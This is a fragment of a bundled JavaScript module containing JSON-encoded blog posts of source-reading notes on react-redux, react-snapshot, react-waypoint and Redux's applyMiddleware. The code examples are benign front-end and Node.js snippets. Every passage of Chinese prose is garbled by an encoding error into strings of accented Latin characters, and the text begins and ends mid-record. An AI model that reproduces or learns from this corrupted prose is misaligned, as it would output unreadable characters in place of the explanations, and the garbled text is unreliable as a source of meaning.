æŠ¥é”™</span>\\n</code></pre>\\n<p>ä¸ä¼ å‚æ•°ï¼Œåˆ™ä»<code>undefined</code>é‡Œ...</p>","slug":"yuan-ma-yue-du-react-redux-can-shu-wei-obj-de-mo-ren-can-shu-xie-fa","sha":"bca6508299954ec1022678e1f36b060954a8e990"}')},676:function(n){n.exports=JSON.parse('{"content":"<p>Providerç»„ä»¶ä¸­æœ‰2ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>componentWillUnmount() {\\n  if (this.unsubscribe) this.unsubscribe()\\n  this._isMounted = false\\n}\\n\\ncomponentDidUpdate(prevProps) {\\n  // æ¯”è¾ƒstoreæ˜¯å¦ç›¸ç­‰,å¦‚æœç›¸ç­‰åˆ™è·³è¿‡\\n  if (this.props.store !== prevProps.store) {\\n    // å–æ¶ˆè®¢é˜…ä¹‹å‰çš„ï¼Œå†è®¢é˜…ç°åœ¨çš„(å› ä¸ºæ•°æ®(store)ä¸åŒäº†)\\n    if (this.unsubscribe) this.unsubscribe()\\n    this.subscribe()\\n  }\\n}</code></pre></code></pre><p>è¿™2æ®µçš„æ„æ€å°±æ˜¯ï¼Œæ¯å½“æ•°æ®å˜äº†ï¼Œå°±å–æ¶ˆä¸Šä¸€æ¬¡æ•°æ®çš„è®¢é˜…ï¼Œåœ¨è®¢é˜…æœ¬æ¬¡çš„æ•°æ®ï¼Œ\\nå½“è¦é”€æ¯ç»„ä»¶ï¼Œå–æ¶ˆè®¢é˜…ã€‚</p>\\n<p>è¿™ä¸ªé€»è¾‘ç”¨<code>Hooks</code>çš„<code>useEffect</code>ç®€ç›´å®Œç¾åŒ¹é…ï¼</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>useEffect(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  subscribe()\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    unSubscribe()\\n  }\\n},props.data)</code></pre></code></pre>\\n<p>è¿™æ®µçš„æ„æ€å°±æ˜¯ï¼Œå½“<code>props.data</code>å‘ç”Ÿæ”¹å˜ï¼Œæ‰§è¡Œ<code>unSubscribe()</code>ï¼Œå†æ‰§è¡Œ<code>subscribe()</code>ã€‚</p>\\n<p>é€»è¾‘å®Œå…¨ä¸€è‡´ï¼</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-18","timeArr":[2018,10,18,0,0,0,0],"title":"æºç é˜…è¯»-react-redux-ä½¿ç”¨Hooksæ›¿æ¢ä¸€å¤„é€»è¾‘","uuid":"75b7a94b953a19ffc6d8a4b8352441ee521ee46e","summary":"<p>Providerç»„ä»¶ä¸­æœ‰2ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼š</p>\\n<pre class=\\"hljs\\"><code>componentWillUnmount() {\\n  if (this.unsubscribe) this.unsubscribe()\\n  this._isMounted = false\\n}\\n\\ncomponentDidUpdate(prevProps) {\\n  //...</code></pre>","slug":"yuan-ma-yue-du-react-redux-shi-yong-Hooks-ti-huan-yi-chu-luo-ji","sha":"914eddfc21a7198b0e39080e62fc5cf7ec280993"}')},677:function(n){n.exports=JSON.parse('{"content":"<p><code>react-snapshot</code>ä¸€ä¸ªç”¨äºreactæœåŠ¡ç«¯æ¸²æŸ“çš„å·¥å…·ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨<code>react V16+</code>çš„<code>hydrate</code>ï¼Œä½†ä¹Ÿèƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿</p>\\n<hr>\\n<h4 id=\\"ku-glob-to-regexp\\">åº“<code>glob-to-regexp</code></h4>\\n<p>å®ƒå¯ä»¥å°†è·¯å¾„è½¬åŒ–ä¸ºæ­£åˆ™ï¼Œé€‚ç”¨äºè·¯å¾„åŒ¹é…</p>\\n<p>ä¾‹å¦‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>re = globToRegExp(<span class=\\"hljs-string\\">\\"*/www/*.js\\"</span>);\\nre.test(<span class=\\"hljs-string\\">\\"http://example.com/www/app.js\\"</span>); <span class=\\"hljs-comment\\">// true</span>\\nre.test(<span class=\\"hljs-string\\">\\"http://example.com/www/lib/factory-proxy-model-observer.js\\"</span>); <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<hr>\\n<h4 id=\\"pathjoin--yu--pathresolve-yu-urlresolve-de-qu-bie\\"><code>path.join</code> ä¸ <code>path.resolve</code>ä¸<code>url.resolve</code>çš„åŒºåˆ«</h4>\\n<ol>\\n<li><p>å¯¹äºä»¥/å¼€å§‹çš„è·¯å¾„ç‰‡æ®µï¼Œpath.joinåªæ˜¯ç®€å•çš„å°†è¯¥è·¯å¾„ç‰‡æ®µè¿›è¡Œæ‹¼æ¥ï¼Œè€Œpath.resolveå°†ä»¥/å¼€å§‹çš„è·¯å¾„ç‰‡æ®µä½œä¸ºæ ¹ç›®å½•ï¼Œåœ¨æ­¤ä¹‹å‰çš„è·¯å¾„å°†ä¼šè¢«ä¸¢å¼ƒï¼Œå°±åƒæ˜¯åœ¨terminalä¸­ä½¿ç”¨cdå‘½ä»¤ä¸€æ ·ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> path.join(<span class=\\"hljs-string\\">\'/a\'</span>, <span class=\\"hljs-string\\">\'/b\'</span>) <span class=\\"hljs-comment\\">// \'a/b\'</span>\\n path.resolve(<span class=\\"hljs-string\\">\'/a\'</span>, <span class=\\"hljs-string\\">\'/b\'</span>) <span class=\\"hljs-comment\\">// \'/b\'</span></code></pre></code></pre>\\n</li>\\n<li><p><code>path.resolve</code>æ€»æ˜¯è¿”å›ä¸€ä¸ªä»¥ç›¸å¯¹äºå‚æ•°1çš„å·¥ä½œç›®å½•ï¼ˆworking directoryï¼‰çš„ç»å¯¹è·¯å¾„ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> path.join(<span class=\\"hljs-string\\">\'./a\'</span>, <span class=\\"hljs-string\\">\'./b\'</span>) <span class=\\"hljs-comment\\">// \'a/b\'</span>\\n path.resolve(<span class=\\"hljs-string\\">\'./a\'</span>, <span class=\\"hljs-string\\">\'./b\'</span>) <span class=\\"hljs-comment\\">// \'/Users/username/Projects/webpack-demo/a/b\'</span></code></pre></code></pre>\\n</li>\\n<li><p><code>url.resolve(a,b)</code>è¿”å›çš„æ˜¯urlæ‹¼æ¥çš„ç»“æœ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> url.resolve(<span class=\\"hljs-string\\">\'/c/\'</span>,<span class=\\"hljs-string\\">\'./xx.png\'</span>) <span class=\\"hljs-comment\\">// /c/xx.png</span>\\n url.resolve(<span class=\\"hljs-string\\">\'/c/\'</span>,<span class=\\"hljs-string\\">\'/xx.png\'</span>)  <span class=\\"hljs-comment\\">// /xx.png</span></code></pre></code></pre>\\n</li>\\n</ol>\\n<ul>\\n<li>å»¶ä¼¸</li>\\n</ul>\\n<ol>\\n<li><p><code>require.resolve()</code>ï¼šè¿”å›å®Œæ•´è·¯å¾„ï¼Œä¸ä¼šæ‰§è¡Œ(è·¯å¾„å¿…é¡»å­˜åœ¨)</p>\\n</li>\\n<li><p><code>process.argv</code>ï¼šå½“å‰<code>cli</code>æŒ‡ä»¤å‚æ•°çš„æ•°ç»„</p>\\n</li>\\n<li><p><code>process.cwd()</code>å’Œ<code>__dirname</code></p>\\n<ul>\\n<li><p><code>process.cwd()</code></p>\\n<p>  æ˜¯å½“å‰æ‰§è¡Œnodeå‘½ä»¤æ—¶å€™çš„æ–‡ä»¶å¤¹åœ°å€ï¼ˆè¢«å“ªä¸ªä½ç½®çš„å‘½ä»¤æ‰§è¡Œæˆ–è€…è°ƒç”¨ï¼‰ </p>\\n<p>  å·¥ä½œç›®å½•ï¼Œä¿è¯äº†æ–‡ä»¶åœ¨ä¸åŒçš„ç›®å½•ä¸‹æ‰§è¡Œæ—¶ï¼Œè·¯å¾„å§‹ç»ˆä¸å˜</p>\\n</li>\\n<li><p><code>__dirname</code> </p>\\n<p>  æ˜¯è¢«æ‰§è¡Œçš„js æ–‡ä»¶çš„åœ°å€ â€”â€”æ–‡ä»¶æ‰€åœ¨ç›®å½•</p>\\n</li>\\n</ul>\\n</li>\\n</ol>\\n<hr>\\n<h4 id=\\"expressstatic\\">express.static</h4>\\n<p><code>express.static(root,[options])</code></p>\\n<p>æ‰˜ç®¡é™æ€èµ„æºï¼Œå½“è¯·æ±‚èµ„æºæ—¶ï¼Œä¼šå»æŸ¥æ‰¾<code>root</code>ç›®å½•ä¸‹çš„é™æ€èµ„æºï¼Œå¤šä¸ª<code>express.static</code>æŒ‰å®šä¹‰é¡ºåºæŸ¥æ‰¾</p>\\n<p>æ­é…<code>app.use</code>å¯ä»¥è®¾å®šä¸€ä¸ªè™šæ‹Ÿç›®å½•</p>\\n<p>ä¾‹å¦‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>app.use(<span class=\\"hljs-string\\">\'/static\'</span>,express.static(__dirname +<span class=\\"hljs-string\\">\'/public\'</span>))</code></pre></code></pre>\\n<p>å½“è¯·æ±‚<code>xxx.com/static/image.png</code>å°±ä¼šè‡ªåŠ¨æŸ¥æ‰¾<code>xx.com/public/image.png</code></p>\\n<hr>\\n<h4 id=\\"jsdom\\">jsdom</h4>\\n<p>ä¸€ä¸ªåœ¨<code>nodeJs</code>ä¸Šæ‰§è¡Œè™šæ‹Ÿdomç¯å¢ƒ</p>\\n<p><code>react-snapshot</code>ä½¿ç”¨çš„<code>jsdom</code>æ¯”è¾ƒæ—§äº†ï¼Œç‰ˆæœ¬æ˜¯<code>9.4.5</code>ï¼Œè€Œå½“å‰æœ€æ–°<code>13.0.0</code>ï¼Œè€Œä¸”æ—§ç‰ˆçš„<code>api</code>ç›®å‰å¥½åƒæ²¡æœ‰ä½¿ç”¨äº†ã€‚</p>\\n<p>å› æ­¤ä¹Ÿæ˜¯æ‰¾åˆ°æ—§ç‰ˆçš„<code>README</code>æ–‡æ¡£çœ‹çš„ï¼Œä¸ç®¡æ˜¯å¦è¿‡æœŸï¼Œå…ˆè®°å½•å§ã€‚</p>\\n<ul>\\n<li><p><code>jsdom.env(string, [scripts], [config], callback);</code></p>\\n<p>  <code>string</code>ç»‘å®šäº†ä¸€ä¸ªurlï¼Œå½“è®¿é—®è¿™ä¸ªurlçš„æ—¶å€™ï¼Œè®©å®ƒåˆ›å»ºä¸€ä¸ªè™šæ‹ŸDOMã€‚</p>\\n<p>  <code>scripts</code>å°†è¦ä»¥<code>&lt;script&gt;</code>æ ‡ç­¾æ’å…¥çš„js</p>\\n<p>  <code>config</code>é…ç½®</p>\\n<p>  <code>callbakc</code>ä¸¤ä¸ªå‚æ•°ï¼Œ<code>err</code>å’Œ<code>window</code>è¿™ä¸ªwindowæ˜¯è™šæ‹ŸDOMçš„<code>window</code></p>\\n</li>\\n<li><p><code>jsdom</code>çš„<code>window</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-built_in\\">window</span>.document.documentElement.outerHTML);\\n  <span class=\\"hljs-comment\\">// output: \\"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;hello world&lt;/body&gt;&lt;/html&gt;\\"</span>\\n\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-built_in\\">window</span>.innerWidth);\\n  <span class=\\"hljs-comment\\">// output: 1024</span>\\n\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">typeof</span> <span class=\\"hljs-built_in\\">window</span>.document.getElementsByClassName);\\n  <span class=\\"hljs-comment\\">// outputs: function</span></code></pre></code></pre>\\n</li>\\n<li><p>è¿™é‡Œçš„ä½¿ç”¨</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  jsdom.env({\\n    <span class=\\"hljs-comment\\">// å½“è®¿é—®è¿™ä¸ªurlæ—¶,è¿™é‡Œçš„urlä»£æ›¿äº† å‚æ•°html</span>\\n    url,\\n    <span class=\\"hljs-comment\\">// å“åº”å¤´è®¾ç½®</span>\\n    <span class=\\"hljs-attr\\">headers</span>: { <span class=\\"hljs-attr\\">Accept</span>: <span class=\\"hljs-string\\">\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\"</span> },\\n    <span class=\\"hljs-comment\\">// å½“å‰urlPathæœ‰å¤–éƒ¨èµ„æºè¯·æ±‚æ—¶ï¼Œæ‹¦æˆªè¯·æ±‚å¹¶ä¸”è¿›è¡Œé…ç½®</span>\\n    resourceLoader(resource, callback) {\\n      <span class=\\"hljs-comment\\">// hostç›¸åŒ</span>\\n      <span class=\\"hljs-keyword\\">if</span> (resource.url.host === host) {\\n        <span class=\\"hljs-comment\\">// ç»§ç»­è·å–èµ„æº</span>\\n        <span class=\\"hljs-comment\\">// ç›¸å½“äº</span>\\n        <span class=\\"hljs-comment\\">/*\\n        resource.defaultFetch(function(err,body){\\n          if(err) return callback(err);\\n          callback(null,body)\\n        });\\n        */</span>\\n        resource.defaultFetch(callback);\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// ä¸è·å–èµ„æº(æœªä¼ å‚æ•°)</span>\\n        callback()\\n      }\\n    },\\n    <span class=\\"hljs-attr\\">features</span>: {\\n      <span class=\\"hljs-comment\\">// å…è®¸jsdom è·å–å“ªç§ç±»å‹çš„å¤–éƒ¨èµ„æº</span>\\n      <span class=\\"hljs-attr\\">FetchExternalResources</span>: [<span class=\\"hljs-string\\">\\"script\\"</span>],\\n      <span class=\\"hljs-comment\\">// æ˜¯å¦å…è®¸jsçš„è¿è¡Œ  [\\"script\\"] or `false`</span>\\n      <span class=\\"hljs-attr\\">ProcessExternalResources</span>: [<span class=\\"hljs-string\\">\\"script\\"</span>],\\n      <span class=\\"hljs-comment\\">// éœ€è¦è¿‡æ»¤çš„ç‰¹å®šèµ„æº</span>\\n      <span class=\\"hljs-attr\\">SkipExternalResources</span>: <span class=\\"hljs-literal\\">false</span>\\n    },\\n    <span class=\\"hljs-comment\\">// å°†window.console è½¬åˆ°nodeçš„è¾“å‡º</span>\\n    <span class=\\"hljs-attr\\">virtualConsole</span>: jsdom.createVirtualConsole().sendTo(<span class=\\"hljs-built_in\\">console</span>),\\n    <span class=\\"hljs-comment\\">// å½“windowå±æ€§è¢«åˆ›å»ºçš„æ—¶å€™</span>\\n    <span class=\\"hljs-attr\\">created</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">err, <span class=\\"hljs-built_in\\">window</span></span>) =&gt;</span> {\\n      <span class=\\"hljs-comment\\">// è¿™é‡Œä¼ å‡ºäº†windowä¾›å¤–éƒ¨ä½¿ç”¨</span>\\n   },\\n    <span class=\\"hljs-comment\\">// å½“windowåˆ›å»ºå’Œdocumentè¯»å–å®Œæ¯•</span>\\n    <span class=\\"hljs-attr\\">done</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">err, <span class=\\"hljs-built_in\\">window</span></span>) =&gt;</span> {}\\n  })</code></pre></code></pre>\\n</li>\\n</ul>\\n<hr>\\n<h4 id=\\"kuo-zhan-reactdomhydrate\\">æ‰©å±•ï¼šReactDOM.hydrate</h4>\\n<p>åœ¨<code>React V15</code>ä¸­ï¼Œå®¢æˆ·ç«¯æ ¹æ®<code>data-react-checksum</code>æ ‡è®°åˆ¤æ–­æ˜¯å¦å¤ç”¨ï¼›æ ¹æ®<code>data-reactid</code>æ ‡è®°ï¼Œè¿½è¸ªäº‹ä»¶å¤„ç†ï¼Œç»‘å®šäº‹ä»¶ã€‚</p>\\n<p>åœ¨<code>React V16</code>ä¸­ï¼Œ<code>hydrate</code>ç”¨äºæœåŠ¡ç«¯æ¸²æŸ“ï¼Œå®¢æˆ·ç«¯ä¼šä¿ç•™(å°½é‡å¤ç”¨)æœåŠ¡ç«¯çš„æ¸²æŸ“ï¼Œå¹¶åªå¯¹äº‹ä»¶è¿›è¡Œè·å–ã€‚</p>\\n<p>è¿™å°±æœ‰ä»¥ä¸‹å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p>\\n<ul>\\n<li><p>å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯æ¸²æŸ“å†…å®¹æœ€å¥½ä¸€è‡´</p>\\n</li>\\n<li><p>å¦‚æœä¸ä¸€è‡´ï¼Œéœ€è¦è‡ªè¡Œå¤„ç†ï¼Œä¸èƒ½ä¿è¯<code>React</code>èƒ½å®Œç¾å¤„ç†ï¼Œå¯ä»¥æ·»åŠ <code>suppressHydrationWarning={true}</code>æ¥å¿½ç•¥å½“å‰å…ƒç´ çš„è­¦å‘Šã€‚</p>\\n</li>\\n<li><p>å¦‚æœè¦æ±‚ä¸ä¸€è‡´ï¼Œå¯ä»¥å°†ä¸ä¸€è‡´çš„å†…å®¹æ”¾åˆ°ç”Ÿå‘½å‘¨æœŸå‡½æ•°å†…è¿›è¡Œæ›´æ–°(æœåŠ¡ç«¯æ¸²æŸ“æ— ç”Ÿå‘½å‘¨æœŸå‡½æ•°)</p>\\n<p>  ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">this</span>.state={\\n    <span class=\\"hljs-attr\\">isClient</span>:<span class=\\"hljs-literal\\">false</span>\\n  }\\n\\n  componentDidMount(){\\n    <span class=\\"hljs-keyword\\">this</span>.setState({\\n      <span class=\\"hljs-attr\\">isClient</span>:<span class=\\"hljs-literal\\">true</span>\\n    })\\n  }</code></pre></code></pre>\\n</li>\\n</ul>\\n","toc":[{"anchor":"ku-glob-to-regexp","level":4,"text":"åº“<code>glob-to-regexp</code>"},{"anchor":"pathjoin--yu--pathresolve-yu-urlresolve-de-qu-bie","level":4,"text":"<code>path.join</code> ä¸ <code>path.resolve</code>ä¸<code>url.resolve</code>çš„åŒºåˆ«"},{"anchor":"expressstatic","level":4,"text":"express.static"},{"anchor":"jsdom","level":4,"text":"jsdom"},{"anchor":"kuo-zhan-reactdomhydrate","level":4,"text":"æ‰©å±•ï¼šReactDOM.hydrate"}],"relatedTags":null,"created_at":"2018-12-03","timeArr":[2018,11,3,0,0,0,0],"title":"æºç é˜…è¯»-react-snapshot","uuid":"1c4e38c3c8cdea68cde83fbec5fb641f85a0c066","summary":"<p><code>react-snapshot</code>ä¸€ä¸ªç”¨äºreactæœåŠ¡ç«¯æ¸²æŸ“çš„å·¥å…·ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨<code>react V16+</code>çš„<code>hydrate</code>ï¼Œä½†ä¹Ÿèƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿</p>","slug":"yuan-ma-yue-du-react-snapshot","sha":"d568476c4e1852e8b6439b1bc26f6ea8435bf4bc"}')},678:function(n){n.exports=JSON.parse('{"content":"<p>æµç¨‹ï¼š</p>\\n<ol>\\n<li><p>å­å…ƒç´ è·å–</p>\\n<p> é€šè¿‡<code>ref</code>è·å–å­å…ƒç´ çš„<code>DOM</code></p>\\n<ul>\\n<li><p>å­å…ƒç´ æ˜¯<code>DOM</code>ï¼ˆæœ€å®¹æ˜“è·å–ï¼‰</p>\\n</li>\\n<li><p>å­å…ƒç´ æ˜¯ç»„ä»¶ï¼Œå°è¯•é€šè¿‡<code>ForwardRef</code>è·å–ï¼Œå¦‚æœå­ç»„ä»¶ä¸æ˜¯<code>ForwardRef</code>ï¼Œé€šè¿‡<code>innerRef</code>è·å–</p>\\n<p>å¦‚æœ<code>ref</code>è·å–ä¸åˆ°å€¼ï¼Œå°†è¿”å›ï¼ˆä¸æ‰§è¡Œï¼‰</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>çˆ¶å…ƒç´ è·å–</p>\\n<p> é€šè¿‡å­å…ƒç´ çš„<code>parentNode</code>å‘ä¸Šéå†ï¼Œç›´åˆ°æ‰¾åˆ°<code>overflow</code>ä¸º<code>auto</code>æˆ–è€…<code>scroll</code>ï¼Œå¦åˆ™è®¾ç½®ä¸º<code>window</code></p>\\n<p> é€šè¿‡<code>getComputedStyle</code>å»è·å–<code>overflow</code>çš„å€¼ã€‚ï¼ˆæ­¤å¤„å¹¶ä¸å®Œç¾ï¼Œä¾èµ–ç”¨æˆ·è‡ªè§‰ï¼‰</p>\\n</li>\\n<li><p>åˆ¤æ–­å­å…ƒç´ æ˜¯å¦å‡ºç°åœ¨è§„å®šèŒƒå›´å†…</p>\\n<p> ç”¨æˆ·å®šä¹‰2ä¸ªå±æ€§ï¼š<code>topOffset</code>å’Œ<code>bottomOffset</code>ï¼Œå¯ä»¥ç†è§£ä¸º<code>ä¸Šè¾¹çº¿</code>å’Œ<code>ä¸‹è¾¹çº¿</code></p>\\n<p> é€šè¿‡<code>getBoundingClientRect</code>ï¼Œè®¡ç®—å‡º<code>å­å…ƒç´ </code>é¡¶ç«¯å’Œåº•ç«¯åˆ°<code>è§†å£</code>é¡¶ç«¯çš„è·ç¦»</p>\\n<p> é€šè¿‡<code>ä¸Š/ä¸‹è¾¹çº¿</code>å’Œ<code>çˆ¶å…ƒç´ </code>çš„é«˜åº¦å’Œ<code>çˆ¶å…ƒç´ </code>é¡¶ç«¯åˆ°è§†å£é¡¶ç«¯çš„è·ç¦»ï¼Œè®¡ç®—å‡º<code>ä¸Š/ä¸‹è¾¹çº¿</code>åˆ†åˆ«è·ç¦»è§†å£é¡¶ç«¯çš„è·ç¦»</p>\\n<p> å¯¹æ¯”ä»¥ä¸Š2ä¸ªæ•°æ®ï¼Œåˆ†åˆ«èµ‹äºˆå½“å‰<code>å­å…ƒç´ </code>çš„4ç§ä½ç½®çŠ¶æ€ï¼š<code>invisible</code>ï¼Œ<code>inside</code>ï¼Œ<code>below</code>ï¼Œ<code>above</code></p>\\n</li>\\n</ol>\\n<p>äº®ç‚¹ï¼š</p>\\n<ol>\\n<li><p>onNextTick ï¼š ä¸€ä¸ªå°†ä»»åŠ¡åŠ å…¥é˜Ÿåˆ—æ‰§è¡Œçš„æ–¹æ¡ˆï¼Œé€šè¿‡<code>setTimeout(()=&gt;{},0)</code>çš„ä½¿ç”¨ï¼š</p>\\n<ol>\\n<li>å¯ä»¥åœ¨ä»»åŠ¡å¼€å§‹å‰åœæ­¢ã€‚</li>\\n<li>ç¡®ä¿<code>ref</code>èƒ½å®Œå…¨è·å–ã€‚</li>\\n<li>ä»»åŠ¡ä¹‹é—´ä¸ä¼šå†²çªã€‚</li>\\n</ol>\\n</li>\\n<li><p>fireOnRapidScroll ï¼š å¦‚æœ<code>scroll</code>æ‰§è¡Œè¿‡å¿«ï¼Œæœ‰å¯èƒ½å­å…ƒç´ ä¸Šä¸€æ¬¡äº‹ä»¶è¿˜åœ¨<code>below</code>ï¼Œè¿™ä¸€æ¬¡å·²ç»æ˜¯<code>above</code>ï¼Œ\\n å½“å‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œä¼šå¼ºåˆ¶æ‰§è¡Œ<code>enter</code>å’Œ<code>leave</code>äº‹ä»¶ã€‚</p>\\n</li>\\n<li><p>ä½¿ç”¨<code>React.cloneElement</code>é…ç½®<code>this.props.children</code></p>\\n</li>\\n</ol>\\n<p>å¯èƒ½å­˜åœ¨çš„ç¼ºé™·ï¼š</p>\\n<p>å½“å­˜åœ¨ä¸€ä¸ªå¾ˆé•¿çš„<code>ul</code>åˆ—è¡¨ï¼Œè€Œç»™<code>ul</code>æ·»åŠ äº†<code>overflow:auto</code>ï¼Œä½†å¹¶æœªè®¾ç½®<code>height</code>ï¼Œè¿™æ—¶<code>ul</code>å¹¶ä¸æ˜¯ä¸€ä¸ªæ»šåŠ¨ç»„ä»¶ï¼Œ\\nçœŸæ­£çš„æ»šåŠ¨è¿˜æ˜¯è§¦å‘åœ¨<code>window</code>ï¼Œä½†<code>waypoint</code>ä¼šå› ä¸ºå­˜åœ¨å±æ€§<code>overflow:auto</code>ï¼Œè€Œå°†<code>ul</code>è®¤ä¸ºæ˜¯æ»šåŠ¨ç»„ä»¶çˆ¶å…ƒç´ ã€‚</p>\\n<p><a href=\\"https://codesandbox.io/s/ly9y4v9m5m\\">ä¾‹å­</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-12-28","timeArr":[2018,11,28,0,0,0,0],"title":"æºç é˜…è¯»-react-waypoint","uuid":"125d2f3de95fae020f190d4c57a5cc55e26a84fd","summary":"<p>æµç¨‹ï¼š</p>\\n<ol>\\n<li>\\n<p>å­å…ƒç´ è·å–</p>\\n<p>é€šè¿‡<code>ref</code>è·å–å­å…ƒç´ çš„<code>DOM</code></p>\\n<ul>\\n<li>å­å…ƒç´ æ˜¯<code>DOM</code>ï¼ˆæœ€å®¹æ˜“è·å–ï¼‰</li>\\n<li>å­å…ƒç´ æ˜¯ç»„ä»¶ï¼Œå°è¯•é€šè¿‡<code>ForwardRef</code>è·å–ï¼Œå¦‚æœå­ç»„ä»¶ä¸æ˜¯<code>ForwardRef</code>ï¼Œé€šè¿‡<code>innerRef</code>è·å–</li>\\n</ul>\\n<p>å¦‚æœ<code>ref</code>è·å–ä¸åˆ°å€¼ï¼Œå°†è¿”å›ï¼ˆ...</p>\\n</li>\\n</ol>","slug":"yuan-ma-yue-du-react-waypoint","sha":"4b00e3a197c088451f6327743beded39e4aaad11"}')},679:function(n){n.exports=JSON.parse('{"content":"<p>å…ˆä¸Šæºç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">applyMiddleware</span>(<span class=\\"hljs-params\\">...middlewares</span>) </span>{\\n  <span class=\\"hljs-comment\\">// ...</span>\\n\\n  <span class=\\"hljs-keyword\\">let</span> dispatch = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Error</span>(\\n    <span class=\\"hljs-string\\">`Dispatching while constructing your middleware is not allowed. `</span> +\\n    <span class=\\"hljs-string\\">`Other middleware would not be applied to this dispatch.`</span>\\n    )\\n  }\\n\\n  <span class=\\"hljs-keyword\\">const</span> middlewareAPI = {\\n    <span class=\\"hljs-attr\\">getState</span>: store.getState,\\n    <span class=\\"hljs-attr\\">dispatch</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> dispatch(...args)\\n  }\\n\\n  <span class=\\"hljs-keyword\\">const</span> chain = middlewares.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">middleware</span> =&gt;</span> middleware(middlewareAPI))\\n  dispatch = compose(...chain)(store.dispatch)\\n\\n  <span class=\\"hljs-comment\\">// ...</span></code></pre></code></pre>\\n<ol>\\n<li>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªç›´æ¥æŠ¥é”™çš„dispatchæ–¹æ³•</li>\\n<li>ç„¶åè®¾å®šäº†APIä¸­çš„dispatchå°±æ˜¯ä¼šæŠ¥é”™çš„dispatchæ–¹æ³•ï¼Œå› æ­¤åœ¨è¿™ä¸ªé˜¶æ®µä»»ä½•ä½¿ç”¨dispatchéƒ½ä¼šå¾—åˆ°é”™è¯¯æç¤º</li>\\n<li>æœ€åæ„é€ ç»“æŸåé‡æ–°èµ‹å€¼dispatch</li>\\n</ol>\\n<p>å½“æ—¶ç¬¬ä¸€çœ¼çœ‹åˆ°è§‰å¾—APIé‚£ä¸ªå¯¹è±¡éƒ½å·²ç»è®¾å®šäº†dispatchæ˜¯ä¸ªæç¤ºé”™è¯¯çš„å‡½æ•°ï¼Œåé¢é‡æ–°èµ‹å€¼dispatchåˆæ²¡æœ‰å¼•ç”¨å…³ç³»ï¼Œæ€ä¹ˆèƒ½å½±å“åˆ°APIå†…çš„dispatchå‘¢ï¼Ÿ</p>\\n<p>åæ¥å†ä»”ç»†ä¸€çœ‹ï¼ŒåŸæ¥APIä¸­æ˜¯è¿™ä¹ˆè®¾ç½®çš„<code>dispatch:()=&gt;dispatch()</code>ï¼Œç”¨äº†å‡½æ•°åŒ…è£¹ï¼Œæ˜¯åŠ¨æ€çš„ï¼›</p>\\n<p>å½“è°ƒç”¨è¿™ä¸ªAPIæ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œå½“å‰æœ€æ–°çš„dispatchå‡½æ•°ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-14","timeArr":[2018,5,14,0,0,0,0],"title":"æºç é˜…è¯»-reduxæºç ä¸€ä¸ªå°æŠ€å·§","uuid":"69fe426e6a96922cdf337f974413968848ec6076","summary":"<p>å…ˆä¸Šæºç ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">applyMiddleware</span>(<span class=\\"hljs-params\\">...middlewares</span>) </span>{\\n  <span class=\\"hljs-comment\\">// ...</span>\\n  \\n  <span class=\\"hljs-keyword\\">let</span> dispatch = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Error</span>(\\n    <span class=\\"hljs-string\\">`Dispatching while 